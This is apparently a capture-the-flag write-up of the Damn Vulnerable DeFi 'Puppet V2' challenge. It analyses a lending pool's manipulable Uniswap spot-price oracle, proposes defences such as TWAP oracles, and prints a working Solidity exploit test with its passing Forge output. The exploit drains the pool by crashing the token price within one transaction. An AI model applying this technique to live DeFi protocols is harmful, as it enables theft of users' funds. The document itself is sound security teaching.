# Puppet V2 Self Project Challenge

This repository contains an in-depth security analysis of the **Puppet V2** lending pool from Damn Vulnerable DeFi v4. It focuses on identifying the oracle-manipulation vulnerability, exploring its root cause, and proposing prevention measures and security recommendations to harden real-world DeFi protocols.

---

## Vulnerability Analysis

### Observations

- The pool relies on Uniswap V2 spot reserves (`getReserves()`) as its price oracle.  
- Collateral requirement is computed as `tokenAmount × spotPrice × 3`.  
- No time-weighted average or external aggregation is used—every call sees the instantaneous, on-chain price.

### Root Cause

- A single, large swap in the same block can drastically skew Uniswap reserves.  
- By swapping all attacker tokens for WETH, the on-chain spot price of DVT collapses to near zero.  
- The manipulated price feeds into `calculateDepositOfWETHRequired()`, reducing the required collateral to an amount the attacker can afford.

### Security Lesson

- On-chain spot prices without smoothing or aggregation expose financial primitives to manipulation by actors with sufficient liquidity.  
- Critical collateral or borrowing calculations must resist single-block price swings.

---

## Prevention

- Integrate time-weighted average price (TWAP) oracles to smooth out short-term volatility.  
- Aggregate multiple independent price feeds (e.g., Chainlink, Band Protocol).  
- Enforce trade-size limits and slippage constraints on any on-chain price fetch.  
- Introduce a minimum time window or block-delay between reserve updates and oracle consumption.

---

## Security Recommendations

- Implement on-chain circuit breakers or anomaly detectors that pause borrowing when reserve ratios shift beyond safe bounds.  
- Restrict or monitor direct ERC20 transfers to the pool to prevent bypassing deposit/mint hooks and disrupting internal accounting.  
- Maintain real-time monitoring and alerting for abnormal on-chain activity and price deviations.  
- Perform regular security audits focused on oracle integrity, reserve management, and economic exploit scenarios.  
- Develop adversarial testing suites that simulate large swaps and liquidity shocks to validate protocol resilience.

---

## Exploit Code Walkthrough
```solidity
function test_puppetV2() public checkSolvedByPlayer {
    // 1. Manipulate price: swap all DVT → WETH on Uniswap
    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);
    uniswapV2Router.swapExactTokensForTokens(
        PLAYER_INITIAL_TOKEN_BALANCE,
        0,
        path,
        player,
        block.timestamp
    );

    // 2. Wrap remaining ETH into WETH under the player's context
    weth.deposit{ value: player.balance }();

    // 3. Calculate required WETH collateral and approve it
    uint256 required = lendingPool.calculateDepositOfWETHRequired(
        POOL_INITIAL_TOKEN_BALANCE
    );
    weth.approve(address(lendingPool), required);

    // 4. Borrow the entire DVT pool with manipulated collateral
    lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

    // 5. Transfer all drained DVT to the recovery account
    token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
}
```
Step 1: Approve and swap the full DVT balance, skewing Uniswap reserves and collapsing the DVT price.

Step 2: Deposit the attacker’s ETH into WETH to satisfy the artificially low collateral requirement.

Step 3: Query the manipulated price, compute the minimal WETH deposit, and approve it.

Step 4: Borrow all DVT from the pool at negligible cost.

Step 5: Forward the stolen tokens to recovery, fulfilling the success assertion.

---

## Exploit Summary

Under a single transaction, the attacker:

1. Swaps the entire 10 000 DVT balance for WETH on Uniswap V2, collapsing the DVT/WETH price.  
2. Wraps remaining ETH into WETH to meet the new, minimal collateral requirement.  
3. Borrows all 1 000 000 DVT from the lending pool using the manipulated spot price.  
4. Transfers the drained DVT into the designated `recovery` account, satisfying success conditions.

---

## Experimental Validation

Running the Forge test suite confirms both the initial setup and the exploit’s success:

```text
PS E:\Project\damn-vulnerable-defi> forge test --match-contract PuppetV2Challenge
>>
Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment.

[⠒] Compiling...
[⠑] Compiling 1 files with Solc 0.8.25
[⠘] Solc 0.8.25 finished in 1.50s
Compiler run successful!

Ran 2 tests for test/puppet-v2/PuppetV2.t.sol:PuppetV2Challenge
[PASS] test_assertInitialState() (gas: 50329)
[PASS] test_puppetV2() (gas: 221391)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 3.10ms (476.90µs CPU time)

Ran 1 test suite in 17.98ms (3.10ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
